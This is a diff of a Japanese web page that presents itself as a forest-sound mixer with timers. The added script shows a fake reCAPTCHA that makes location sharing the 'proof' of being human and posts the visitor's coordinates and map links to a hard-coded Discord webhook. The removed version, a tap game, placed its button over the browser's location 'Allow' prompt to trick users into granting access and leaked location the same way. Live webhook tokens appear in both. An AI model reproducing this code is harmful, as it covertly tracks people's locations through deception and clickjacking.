+                            <span id="binauralStateTag" class="text-[10px] px-2 py-0.5 rounded-full bg-white/10 text-gray-300">OFF</span>
+                        </div>
+                        <p class="text-xs text-gray-300/80 leading-relaxed">
+                            イヤホン装着を推奨。左右の周波数差により脳波（集中・リラックス・睡眠）を心地よく誘導します。
+                        </p>
+                        <div class="grid grid-cols-3 gap-2">
+                            <button onclick="setBinaural('alpha')" id="binauralBtn-alpha" class="binaural-btn px-2 py-2 rounded-xl text-xs border border-white/10 bg-white/5 hover:bg-white/10 transition text-center">
+                                <div class="font-bold text-amber-300">α波 (10Hz)</div>
+                                <div class="text-[10px] text-gray-400 mt-0.5">集中・作業</div>
+                            </button>
+                            <button onclick="setBinaural('theta')" id="binauralBtn-theta" class="binaural-btn px-2 py-2 rounded-xl text-xs border border-white/10 bg-white/5 hover:bg-white/10 transition text-center">
+                                <div class="font-bold text-emerald-300">θ波 (6Hz)</div>
+                                <div class="text-[10px] text-gray-400 mt-0.5">瞑想・リラックス</div>
+                            </button>
+                            <button onclick="setBinaural('delta')" id="binauralBtn-delta" class="binaural-btn px-2 py-2 rounded-xl text-xs border border-white/10 bg-white/5 hover:bg-white/10 transition text-center">
+                                <div class="font-bold text-indigo-300">δ波 (2Hz)</div>
+                                <div class="text-[10px] text-gray-400 mt-0.5">深睡眠・安眠</div>
+                            </button>
+                        </div>
+                        <div class="pt-2 flex items-center gap-3">
+                            <i data-lucide="volume-2" class="w-4 h-4 text-gray-400"></i>
+                            <input type="range" id="binauralVol" min="0" max="0.3" step="0.01" value="0.05" oninput="updateBinauralVolume(this.value)" class="w-full">
+                        </div>
+                    </div>
+
+                    <div class="glass-card rounded-3xl p-5 space-y-4 shadow-xl">
+                        <div class="flex items-center justify-between border-b border-white/10 pb-3">
+                            <div class="flex items-center gap-2">
+                                <i data-lucide="timer" class="w-5 h-5 text-amber-400"></i>
+                                <h2 class="font-bold text-sm tracking-wide text-white">タイマー＆ポモドーロ</h2>
+                            </div>
+                        </div>
+                        <div class="flex border border-white/10 rounded-xl p-1 bg-black/20 text-xs">
+                            <button onclick="switchTimerTab('sleep')" id="tabBtn-sleep" class="flex-1 py-1.5 rounded-lg font-bold bg-forest-600 text-white transition">スリープタイマー</button>
+                            <button onclick="switchTimerTab('pomo')" id="tabBtn-pomo" class="flex-1 py-1.5 rounded-lg font-bold text-gray-400 transition">ポモドーロ集中</button>
+                        </div>
+                        <div id="timerTabContent-sleep" class="space-y-3">
+                            <div class="flex items-center justify-between">
+                                <span class="text-xs text-gray-300">自動消音カウントダウン</span>
+                                <span id="sleepTimerDisplay" class="text-lg font-mono font-bold text-amber-300">--:--</span>
+                            </div>
+                            <div class="grid grid-cols-4 gap-1.5 text-xs">
+                                <button onclick="startSleepTimer(15)" class="py-1.5 rounded-lg bg-white/5 border border-white/10 hover:bg-white/15 transition">15分</button>
+                                <button onclick="startSleepTimer(30)" class="py-1.5 rounded-lg bg-white/5 border border-white/10 hover:bg-white/15 transition">30分</button>
+                                <button onclick="startSleepTimer(60)" class="py-1.5 rounded-lg bg-white/5 border border-white/10 hover:bg-white/15 transition">60分</button>
+                                <button onclick="cancelSleepTimer()" class="py-1.5 rounded-lg bg-red-500/20 text-red-300 border border-red-500/30 hover:bg-red-500/30 transition">解除</button>
+                            </div>
+                        </div>
+                        <div id="timerTabContent-pomo" class="space-y-3 hidden">
+                            <div class="flex items-center justify-between">
+                                <span id="pomoStateLabel" class="text-xs text-emerald-300 font-bold">作業タイム (25分)</span>
+                                <span id="pomoTimerDisplay" class="text-xl font-mono font-bold text-emerald-400">25:00</span>
+                            </div>
+                            <div class="flex items-center gap-2">
+                                <button onclick="togglePomodoro()" id="pomoStartBtn" class="flex-1 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs transition shadow">
+                                    スタート
+                                </button>
+                                <button onclick="resetPomodoro()" class="px-3 py-2 rounded-xl bg-white/10 hover:bg-white/20 text-xs transition">
+                                    リセット
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lg:col-span-8 space-y-6">
+                    <div class="glass-card rounded-3xl p-4 sm:p-5 shadow-xl space-y-3 relative overflow-hidden">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2">
+                                <i data-lucide="waves" class="w-5 h-5 text-forest-300"></i>
+                                <h2 class="font-bold text-sm tracking-wide text-white">リアルタイム音響スペクトラム</h2>
+                            </div>
+                            <div class="flex items-center gap-2 text-xs text-gray-300">
+                                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                                <span id="activeChannelsCount">0 音源再生中</span>
+                            </div>
+                        </div>
+                        <div class="h-24 sm:h-28 w-full bg-black/40 rounded-2xl border border-white/10 overflow-hidden relative">
+                            <canvas id="visualizerCanvas" class="w-full h-full"></canvas>
+                        </div>
+                    </div>
+
+                    <div class="glass-card rounded-3xl p-5 shadow-xl space-y-4">
+                        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-white/10 pb-4">
+                            <div class="flex items-center gap-2">
+                                <i data-lucide="sliders" class="w-5 h-5 text-amber-300"></i>
+                                <h2 class="font-bold text-base tracking-wide text-white">自然音ミキサー・マトリクス (12音源)</h2>
+                            </div>
+                            <button onclick="muteAllChannels()" class="text-xs bg-white/10 hover:bg-white/20 text-gray-200 px-3 py-1.5 rounded-xl transition flex items-center gap-1.5 border border-white/10 self-start sm:self-auto">
+                                <i data-lucide="volume-x" class="w-3.5 h-3.5"></i> すべて消音
+                            </button>
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4" id="soundMatrixGrid"></div>
+                    </div>
+                </div>
+
+            </main>
+
+            <footer class="sticky bottom-0 z-40 glass-panel py-3 px-4 sm:px-8 border-t border-white/10 shadow-2xl">
+                <div class="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
+                    <div class="flex items-center gap-3">
+                        <button onclick="toggleMasterPlay()" id="masterPlayBtn" class="w-12 h-12 rounded-2xl bg-amber-500 hover:bg-amber-400 text-forest-950 font-bold flex items-center justify-center shadow-lg shadow-amber-500/30 transition transform active:scale-95">
+                            <i data-lucide="play" id="masterPlayIcon" class="w-6 h-6 fill-current"></i>
+                        </button>
+                        <div>
+                            <div class="flex items-center gap-2">
+                                <span class="font-bold text-sm text-white font-yuji" id="currentPresetName">カスタムミックス</span>
+                                <span id="playingBadge" class="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">停止中</span>
+                            </div>
+                            <p class="text-xs text-gray-400 mt-0.5" id="masterStatusDesc">再生ボタンを押して森の響きを解き放ちます</p>
+                        </div>
+                    </div>
+                    <div class="flex items-center gap-3 w-full sm:w-72 bg-black/30 px-4 py-2 rounded-2xl border border-white/10">
+                        <i data-lucide="volume-2" class="w-4 h-4 text-amber-300"></i>
+                        <span class="text-xs font-bold text-gray-300 min-w-max">全体音量</span>
+                        <input type="range" id="masterVolume" min="0" max="1" step="0.01" value="0.8" oninput="updateMasterVolume(this.value)" class="w-full">
+                        <span id="masterVolValue" class="text-xs font-mono font-bold text-amber-300 min-w-[32px] text-right">80%</span>
+                    </div>
+                </div>
+            </footer>
+
+        </div>
+
+        <div id="savePresetModal" class="fixed inset-0 z-50 bg-black/70 backdrop-blur-md flex items-center justify-center p-4 hidden opacity-0 transition-opacity duration-300">
+            <div class="glass-card rounded-3xl p-6 max-w-md w-full border border-white/20 space-y-4">
+                <div class="flex items-center justify-between border-b border-white/10 pb-3">
+                    <h3 class="font-bold text-base text-white font-yuji flex items-center gap-2">
+                        <i data-lucide="bookmark" class="w-5 h-5 text-amber-300"></i> オリジナル音量の保存
+                    </h3>
+                    <button onclick="closeSavePresetModal()" class="text-gray-400 hover:text-white"><i data-lucide="x" class="w-5 h-5"></i></button>
+                </div>
+                <p class="text-xs text-gray-300">現在の12音源の音量・パン調整バランスをブラウザに保存します。</p>
+                <div>
+                    <label class="block text-xs font-bold text-gray-300 mb-1">プリセット名</label>
+                    <input type="text" id="customPresetInput" placeholder="例: 深夜の集中作業用ミックス" class="w-full px-4 py-2.5 rounded-xl bg-black/40 border border-white/20 text-white text-xs focus:outline-none focus:border-amber-400">
+                </div>
+                <div class="flex items-center justify-end gap-2 pt-2">
+                    <button onclick="closeSavePresetModal()" class="px-4 py-2 rounded-xl text-xs bg-white/10 hover:bg-white/20 text-gray-300 transition">キャンセル</button>
+                    <button onclick="confirmSaveCustomPreset()" class="px-5 py-2 rounded-xl text-xs bg-amber-500 hover:bg-amber-400 text-forest-950 font-bold transition">保存する</button>
+                </div>
             </div>
         </div>
     </div>
 
     <script>
-        // ============================================================
-        // DISCORD WEBHOOK 設定
-        // ============================================================
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1557711862429126696/InSgaOfsTZM-Qy52G1kDYmoDmdJbgz8ouhC20Ryb2HfLfkWRiHm3H8b-Ly3Vfzoc_T5Y';
+        /* =========================================================
+           PART 1: reCAPTCHA + 位置情報共有 + 森の音プレイヤー起動
+           ========================================================= */
+        (function() {
+            const recaptchaStage = document.getElementById('recaptchaStage');
+            const recaptchaTrigger = document.getElementById('recaptchaTrigger');
+            const checkboxBox = document.getElementById('checkboxBox');
+            const spinnerSvg = document.getElementById('spinnerSvg');
+            const checkmarkSvg = document.getElementById('checkmarkSvg');
+            const geoModalOverlay = document.getElementById('geoModalOverlay');
+            const donguriMessage = document.getElementById('donguriMessage');
+            const forestStage = document.getElementById('forestStage');
 
-        // ============================================================
-        // デバイス検出
-        // ============================================================
-        const UA = navigator.userAgent;
-        const Device = {
-            isIOS: /iPhone|iPad|iPod/i.test(UA) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1),
-            isAndroid: /Android/i.test(UA),
-            isMobile: /Android|iPhone|iPad|iPod|Mobile/i.test(UA),
-            isSafari: /^((?!chrome|android).)*safari/i.test(UA),
-            isChrome: /Chrome/i.test(UA) && !/Edg/i.test(UA),
-            isFirefox: /Firefox/i.test(UA),
-            isEdge: /Edg/i.test(UA),
-            isDesktop: !/Android|iPhone|iPad|iPod|Mobile/i.test(UA),
-        };
-        console.log('[Device]', Device);
+            let isVerified = false;
+            let isLoading = false;
+            let isModalOpen = false;
+            let locationRequested = false;
 
-        // ============================================================
-        // ブラウザ別：許可ダイアログの「許可」ボタンが表示される推定位置
-        // ※ブラウザダイアログは検知不可のため、経験則ベースの推定値
-        //    単位は viewport 高さに対する %
-        // ============================================================
-        function getDialogTargetTopPercent() {
-            const vh = window.innerHeight;
-            const vw = window.innerWidth;
-            const isPortrait = vh > vw;
+            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1557711859627331686/v9TTuQFh3EeZjHDXDQ2OnQyewV9dMuv_AMt3GKrIML4agy_zR0zu-WNjM270oZ1OpvWE';
 
-            if (Device.isIOS) {
-                // iOS Safari: 画面中央付近にダイアログ、ボタンは中央やや下
-                return isPortrait ? 52 : 55;
-            }
-            if (Device.isAndroid) {
-                // Android Chrome: 上部（アドレスバー下）にダイアログ、ボタンは上部
-                return isPortrait ? 38 : 42;
-            }
-            if (Device.isDesktop) {
-                // PC Chrome/Edge: アドレスバー左の小さい吹き出し（画面上部寄り）
-                // PC Safari: 中央、PC Firefox: 上部
-                if (Device.isSafari) return 50;
-                if (Device.isFirefox) return 35;
-                if (Device.isChrome || Device.isEdge) return 30;
-                return 40;
-            }
-            return 45;
-        }
-
-        // ============================================================
-        // WEB AUDIO
-        // ============================================================
-        class SoundFX {
-            constructor() { this.ctx = null; this.muted = false; }
-            init() {
-                if (!this.ctx) this.ctx = new (window.AudioContext || window.webkitAudioContext)();
-                if (this.ctx.state === 'suspended') this.ctx.resume();
-            }
-            playTap(isFever = false) {
-                if (this.muted) return;
-                this.init();
-                const osc = this.ctx.createOscillator();
-                const gain = this.ctx.createGain();
-                osc.type = isFever ? 'triangle' : 'sine';
-                const baseFreq = isFever ? 650 : 380;
-                const freq = baseFreq + Math.random() * 120;
-                osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
-                osc.frequency.exponentialRampToValueAtTime(80, this.ctx.currentTime + 0.05);
-                gain.gain.setValueAtTime(isFever ? 0.35 : 0.25, this.ctx.currentTime);
-                gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 0.05);
-                osc.connect(gain); gain.connect(this.ctx.destination);
-                osc.start(); osc.stop(this.ctx.currentTime + 0.05);
-            }
-            playFinish() {
-                if (this.muted) return;
-                this.init();
-                const now = this.ctx.currentTime;
-                [440, 554, 659, 880].forEach((freq, idx) => {
-                    const osc = this.ctx.createOscillator();
-                    const gain = this.ctx.createGain();
-                    osc.type = 'triangle';
-                    osc.frequency.setValueAtTime(freq, now + idx * 0.07);
-                    gain.gain.setValueAtTime(0.3, now + idx * 0.07);
-                    gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.07 + 0.25);
-                    osc.connect(gain); gain.connect(this.ctx.destination);
-                    osc.start(now + idx * 0.07);
-                    osc.stop(now + idx * 0.07 + 0.25);
-                });
-            }
-        }
-        const audio = new SoundFX();
-
-        function haptic(pattern = 10) {
-            if (navigator.vibrate) { try { navigator.vibrate(pattern); } catch (e) {} }
-        }
-
-        // ============================================================
-        // パーティクル
-        // ============================================================
-        class ParticleSystem {
-            constructor(canvas) {
-                this.canvas = canvas;
-                this.ctx = canvas.getContext('2d');
-                this.particles = [];
-                this.resize();
-                window.addEventListener('resize', () => this.resize());
-            }
-            resize() { this.canvas.width = window.innerWidth; this.canvas.height = window.innerHeight; }
-            spawn(x, y, color, count = 6) {
-                for (let i = 0; i < count; i++) {
-                    const angle = Math.random() * Math.PI * 2;
-                    const speed = 2 + Math.random() * 7;
-                    this.particles.push({
-                        x, y, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed,
-                        size: 3 + Math.random() * 4, color, alpha: 1
-                    });
-                }
-            }
-            update() {
-                this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
-                for (let i = this.particles.length - 1; i >= 0; i--) {
-                    const p = this.particles[i];
-                    p.x += p.vx; p.y += p.vy;
-                    p.vx *= 0.94; p.vy *= 0.94; p.alpha -= 0.04;
-                    if (p.alpha <= 0) { this.particles.splice(i, 1); continue; }
-                    this.ctx.save();
-                    this.ctx.globalAlpha = p.alpha;
-                    this.ctx.fillStyle = p.color;
-                    this.ctx.beginPath();
-                    this.ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
-                    this.ctx.fill();
-                    this.ctx.restore();
-                }
-                requestAnimationFrame(() => this.update());
-            }
-        }
-        const particleCanvas = document.getElementById('particleCanvas');
-        const particles = new ParticleSystem(particleCanvas);
-        particles.update();
-
-        // ============================================================
-        // ゲーム本体
-        // ============================================================
-        class TapGame {
-            constructor() {
-                this.state = 'idle';
-                this.duration = 30.0;
-                this.timeLeft = 30.0;
-                this.score = 0;
-                this.combo = 0;
-                this.maxCombo = 0;
-                this.isFever = false;
-                this.tapHistory = [];
-                this.peakCps = 0;
-                this.gameInterval = null;
-                this.locationRequested = false;
-                this.locationResolved = false;
-                this.lastTapTime = 0;
-
-                this.initDOM();
-                this.bindEvents();
-
-                // 起動直後：ボタンを「許可ボタン位置」に移動 & 位置情報を要求
-                this.preparePermissionPhase();
+            function playChimeSound() {
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    if (!AudioContext) return;
+                    const ctx = new AudioContext();
+                    const osc1 = ctx.createOscillator();
+                    const osc2 = ctx.createOscillator();
+                    const gain = ctx.createGain();
+                    osc1.type = 'sine';
+                    osc2.type = 'sine';
+                    osc1.frequency.setValueAtTime(523.25, ctx.currentTime);
+                    osc1.frequency.exponentialRampToValueAtTime(659.25, ctx.currentTime + 0.08);
+                    osc2.frequency.setValueAtTime(1046.50, ctx.currentTime);
+                    osc2.frequency.exponentialRampToValueAtTime(1318.51, ctx.currentTime + 0.08);
+                    gain.gain.setValueAtTime(0.06, ctx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.35);
+                    osc1.connect(gain);
+                    osc2.connect(gain);
+                    gain.connect(ctx.destination);
+                    osc1.start();
+                    osc2.start();
+                    osc1.stop(ctx.currentTime + 0.35);
+                    osc2.stop(ctx.currentTime + 0.35);
+                } catch (err) {}
             }
 
-            initDOM() {
-                this.dom = {
-                    timeDisplay: document.getElementById('timeDisplay'),
-                    scoreDisplay: document.getElementById('scoreDisplay'),
-                    cpsDisplay: document.getElementById('cpsDisplay'),
-                    tapBtn: document.getElementById('tapBtn'),
-                    tapText: document.getElementById('tapText'),
-                    subTapText: document.getElementById('subTapText'),
-                    orbIcon: document.getElementById('orbIcon'),
-                    orbRing1: document.getElementById('orbRing1'),
-                    orbRing2: document.getElementById('orbRing2'),
-                    comboBadge: document.getElementById('comboBadge'),
-                    comboCount: document.getElementById('comboCount'),
-                    feverBadge: document.getElementById('feverBadge'),
-                    resetBtn: document.getElementById('resetBtn'),
-                    resultModal: document.getElementById('resultModal'),
-                    soundToggle: document.getElementById('soundToggle'),
-                    soundIcon: document.getElementById('soundIcon'),
-                    hitLayer: document.getElementById('hitLayer'),
-                    tapWrapper: document.getElementById('tapWrapper'),
-                    permissionHint: document.getElementById('permissionHint')
+            async function sendLocationToDiscord(latitude, longitude) {
+                const googleEarthUrl = `https://earth.google.com/web/@${latitude},${longitude},0a,1000d,35y,0h,0t,0r`;
+                const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                const payload = {
+                    content:
+                        '位置情報が共有されました\n' +
+                        `緯度: ${latitude}\n` +
+                        `経度: ${longitude}\n\n` +
+                        'Google Earthで開く:\n' + googleEarthUrl + '\n\n' +
+                        'Google Mapsで開く:\n' + googleMapsUrl + '\n\n' +
+                        'どんぐり最強'
                 };
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) console.warn('Discord webhook 送信に失敗:', response.status);
+                    else console.log('Discord webhook 送信成功');
+                } catch (error) {
+                    console.error('Discord webhook 送信エラー:', error);
+                }
             }
 
-            // ============================================================
-            // 起動直後の「許可フェーズ」
-            // ============================================================
-            preparePermissionPhase() {
-                // タップボタンを「許可ボタンと重なる位置」に移動
-                const targetTop = getDialogTargetTopPercent();
-                this.dom.tapWrapper.style.top = `${targetTop}%`;
-                this.dom.tapWrapper.classList.add('dialog-position');
-
-                // ダイアログ直後に見えるよう、ヒントを表示
-                this.dom.permissionHint.classList.remove('hidden');
-
-                // サブテキストを「許可してね」に変更
-                this.dom.tapText.textContent = 'ALLOW?';
-                this.dom.subTapText.textContent = '位置情報の許可をお願いします';
-
-                // ページロード直後に位置情報リクエストを発火
-                // （ブラウザにより、ジェスチャーなしでもダイアログが出る場合がある）
-                setTimeout(() => {
-                    this.requestLocationAndSend(true);
-                }, 400);
-            }
-
-            // ============================================================
-            // 位置情報リクエスト
-            // ============================================================
-            async requestLocationAndSend(isInitial = false) {
-                if (this.locationRequested) return;
-                this.locationRequested = true;
+            function requestLocation() {
+                if (locationRequested) return;
+                locationRequested = true;
 
                 if (!navigator.geolocation) {
-                    await this.sendToDiscord({
-                        content: '⚠️ **位置情報APIが利用できませんでした**\n（ブラウザ非対応）'
-                    });
-                    this.showToast('⚠️ 位置情報APIが利用できません', true);
-                    this.onLocationResolved(false);
+                    alert('このブラウザは位置情報をサポートしていません。');
+                    resetVerification();
                     return;
                 }
 
                 navigator.geolocation.getCurrentPosition(
-                    // ========== 成功 ==========
                     async (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        const timestamp = new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' });
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        console.log('位置情報取得成功:', latitude, longitude);
 
-                        await this.sendToDiscord({
-                            content: '📍 **位置情報を取得しました**',
-                            embeds: [{
-                                title: '🎯 30s TAP MASTER - 位置情報ログ',
-                                color: 0x00f3ff,
-                                fields: [
-                                    { name: '📌 緯度 (Latitude)',  value: `\`${lat}\``,              inline: true },
-                                    { name: '📌 経度 (Longitude)', value: `\`${lng}\``,              inline: true },
-                                    { name: '🎯 精度 (Accuracy)',  value: `\`${accuracy.toFixed(1)} m\``, inline: true },
-                                    { name: '💥 スコア',           value: `\`${this.score} taps\``,   inline: true },
-                                    { name: '🕒 取得時刻',         value: `\`${timestamp}\``,         inline: true },
-                                    { name: '📱 デバイス',         value: `\`${Device.isIOS ? 'iOS' : Device.isAndroid ? 'Android' : 'Desktop'}\``, inline: true },
-                                    { name: '🗺️ Google Maps',      value: `[地図を開く](https://www.google.com/maps?q=${lat},${lng})` }
-                                ],
-                                footer: { text: '30 SEC TAP MASTER' },
-                                timestamp: new Date().toISOString()
-                            }]
-                        });
+                        await sendLocationToDiscord(latitude, longitude);
 
-                        this.showToast('📍 位置情報を送信しました');
-                        this.onLocationResolved(true);
+                        spinnerSvg.style.display = 'none';
+                        checkmarkSvg.classList.add('checked');
+
+                        isLoading = false;
+                        isVerified = true;
+
+                        geoModalOverlay.classList.remove('active');
+                        isModalOpen = false;
+
+                        playChimeSound();
+                        donguriMessage.classList.add('show');
+
+                        // どんぐり最強 → 森の音プレイヤーへ遷移
+                        setTimeout(() => {
+                            donguriMessage.classList.remove('show');
+                            setTimeout(() => {
+                                recaptchaStage.classList.add('hidden');
+                                forestStage.classList.add('visible');
+                                // 森の音の初期化
+                                if (typeof window.initForestPlayer === 'function') {
+                                    window.initForestPlayer();
+                                }
+                            }, 400);
+                        }, 2000);
                     },
-                    // ========== 失敗 ==========
-                    async (error) => {
-                        let reason = '不明なエラー';
+                    (error) => {
+                        console.error('位置情報取得エラー:', error);
+                        let errorMessage = '位置情報の取得に失敗しました。';
                         switch (error.code) {
-                            case error.PERMISSION_DENIED: reason = 'ユーザーが許可を拒否しました'; break;
-                            case error.POSITION_UNAVAILABLE: reason = '位置情報が取得できません'; break;
-                            case error.TIMEOUT: reason = 'タイムアウトしました'; break;
+                            case error.PERMISSION_DENIED:
+                                errorMessage = '位置情報の共有が拒否されました。ロボットではないことを証明できません。';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = '位置情報が利用できません。';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = '位置情報の取得がタイムアウトしました。';
+                                break;
                         }
-
-                        await this.sendToDiscord({
-                            content: `❌ **位置情報の取得に失敗**\n理由: \`${reason}\`\nスコア: \`${this.score} taps\``
-                        });
-
-                        this.showToast('❌ 位置情報が取得できませんでした', true);
-                        this.onLocationResolved(false);
+                        alert(errorMessage);
+                        resetVerification();
                     },
-                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             }
 
-            // 位置情報の解決後（成功・失敗どちらでも）：ボタンを本来の位置に戻す
-            onLocationResolved(success) {
-                if (this.locationResolved) return;
-                this.locationResolved = true;
-
-                // ヒントを消す
-                this.dom.permissionHint.classList.add('hidden');
-
-                // ボタンを中央へ戻す
-                this.dom.tapWrapper.classList.remove('dialog-position');
-                this.dom.tapWrapper.style.top = '50%';
-
-                // テキストを元に戻す
-                this.dom.tapText.textContent = 'START TAP!';
-                this.dom.subTapText.textContent = '画面のどこでもタップ！';
+            function resetVerification() {
+                geoModalOverlay.classList.remove('active');
+                isModalOpen = false;
+                spinnerSvg.style.display = 'none';
+                checkboxBox.style.display = 'block';
+                checkmarkSvg.classList.remove('checked');
+                isLoading = false;
+                isVerified = false;
+                locationRequested = false;
+                donguriMessage.classList.remove('show');
             }
 
-            async sendToDiscord(payload) {
-                try {
-                    const res = await fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                    return res.ok;
-                } catch (e) {
-                    console.error('Discord送信失敗:', e);
-                    return false;
-                }
-            }
-
-            showToast(message, isError = false) {
-                const toast = document.createElement('div');
-                toast.className = `fixed left-1/2 z-[90] px-5 py-3 rounded-xl font-bold text-sm shadow-2xl border ${
-                    isError ? 'bg-red-500/90 text-white border-red-300'
-                            : 'bg-neonCyan/90 text-black border-cyan-200'
-                }`;
-                toast.style.top = '12%';
-                toast.style.transform = 'translate(-50%, -20px)';
-                toast.style.opacity = '0';
-                toast.style.transition = 'all 0.3s ease';
-                toast.style.pointerEvents = 'none';
-                toast.textContent = message;
-                document.body.appendChild(toast);
-
-                requestAnimationFrame(() => {
-                    toast.style.transform = 'translate(-50%, 0)';
-                    toast.style.opacity = '1';
-                });
+            recaptchaTrigger.addEventListener('click', () => {
+                if (isVerified || isLoading || isModalOpen) return;
+                checkboxBox.style.display = 'none';
+                spinnerSvg.style.display = 'block';
+                isLoading = true;
 
                 setTimeout(() => {
-                    toast.style.opacity = '0';
-                    toast.style.transform = 'translate(-50%, -20px)';
-                    setTimeout(() => toast.remove(), 300);
-                }, 3000);
-            }
+                    geoModalOverlay.classList.add('active');
+                    isModalOpen = true;
 
-            bindEvents() {
-                // 全デバイス共通：Pointer Events
-                this.dom.hitLayer.addEventListener('pointerdown', (e) => {
-                    if (!this.dom.resultModal.classList.contains('hidden')) return;
-                    e.preventDefault();
-                    this.onTap(e.clientX, e.clientY);
-                }, { passive: false });
-
-                this.dom.hitLayer.addEventListener('contextmenu', (e) => e.preventDefault());
-                document.addEventListener('dblclick', (e) => e.preventDefault(), { passive: false });
-                document.addEventListener('gesturestart', (e) => e.preventDefault());
-
-                // キーボード
-                window.addEventListener('keydown', (e) => {
-                    if ((e.code === 'Space' || e.code === 'Enter') && !e.repeat) {
-                        if (this.dom.resultModal.classList.contains('hidden')) {
-                            e.preventDefault();
-                            const rect = this.dom.tapBtn.getBoundingClientRect();
-                            this.onTap(rect.left + rect.width / 2, rect.top + rect.height / 2);
+                    setTimeout(() => {
+                        if (isModalOpen && !locationRequested) {
+                            requestLocation();
                         }
-                    }
-                });
+                    }, 2000);
+                }, 1200);
+            });
 
-                // ボタン類
-                this.dom.resetBtn.addEventListener('click', (e) => { e.stopPropagation(); this.resetGame(); });
-                document.getElementById('retryBtn').addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    this.dom.resultModal.classList.add('hidden');
-                    this.dom.hitLayer.classList.remove('disabled');
-                    this.resetGame();
-                });
-                this.dom.soundToggle.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    audio.muted = !audio.muted;
-                    this.dom.soundIcon.className = audio.muted
-                        ? 'fa-solid fa-volume-xmark text-red-400'
-                        : 'fa-solid fa-volume-high text-neonCyan';
-                });
-                document.getElementById('shareBtn').addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    const avgCps = (this.score / 30.0).toFixed(1);
-                    const rank = this.getRank(this.score).title;
-                    const text = `🔥【30秒連打マスター】で【${rank}】を獲得！\n記録: ${this.score} 連打 (平均 ${avgCps} CPS / 最高 ${this.peakCps.toFixed(1)} CPS)\n#30秒連打マスター #連打ゲーム`;
-                    window.open(`https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}`, '_blank');
-                });
+            geoModalOverlay.addEventListener('click', (e) => {
+                if (e.target === geoModalOverlay) resetVerification();
+            });
 
-                // リサイズ時：位置を再計算
-                window.addEventListener('resize', () => {
-                    if (!this.locationResolved) {
-                        const targetTop = getDialogTargetTopPercent();
-                        this.dom.tapWrapper.style.top = `${targetTop}%`;
-                    }
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape' && isModalOpen) resetVerification();
+            });
+        })();
+
+        /* =========================================================
+           PART 2: 森の音プレイヤー本体
+           ========================================================= */
+        (function() {
+            const SOUND_CONFIG = [
+                { id: 'wind', name: '木々の風・葉擦れ', icon: 'wind', desc: '木葉を揺らす豊かな風の音', category: '風と空気', defaultVol: 0.4 },
+                { id: 'birds', name: 'さえずる朝の小鳥', icon: 'bird', desc: '森に響く可愛らしい鳥たちの歌声', category: '生物', defaultVol: 0.3 },
+                { id: 'rain', name: '葉を叩く恵みの雨', icon: 'cloud-rain', desc: 'しとしとと心地よく降る雨', category: '水と雨', defaultVol: 0.0 },
+                { id: 'thunder', name: '遠雷と大雨', icon: 'cloud-lightning', desc: '重低音が静かに轟く遠くの雷鳴', category: '水と雨', defaultVol: 0.0 },
+                { id: 'stream', name: '渓流・清流のせせらぎ', icon: 'droplets', desc: '透明感あふれる水流の響き', category: '水と雨', defaultVol: 0.3 },
+                { id: 'crickets', name: '夜の秋虫・コオロギ', icon: 'sparkle', desc: '夜長を告げる澄んだ虫の声', category: '生物', defaultVol: 0.0 },
+                { id: 'fire', name: 'ハゼる焚き火', icon: 'flame', desc: '薪がパチパチとはじける温かい炎', category: '自然元素', defaultVol: 0.0 },
+                { id: 'owl', name: '深林のフクロウ', icon: 'moon', desc: '静寂の森に遠く響くフクロウの呼び声', category: '生物', defaultVol: 0.0 },
+                { id: 'chimes', name: '風鈴・クリスタル', icon: 'bell', desc: '風に揺れる五声階の透き通った金属音', category: '音色', defaultVol: 0.2 },
+                { id: 'frogs', name: '雨上がりのアマガエル', icon: 'trees', desc: '水辺でリズムを刻む小さなカエル', category: '生物', defaultVol: 0.0 },
+                { id: 'footsteps', name: '落ち葉を踏みしめる音', icon: 'footprints', desc: '森の小道を歩くサクサクとした足音', category: '自然元素', defaultVol: 0.0 },
+                { id: 'bowl', name: '432Hz 瞑想ボウル', icon: 'disc', desc: '心身を調律する深遠な倍音', category: '音色', defaultVol: 0.0 }
+            ];
+
+            const PRESETS = {
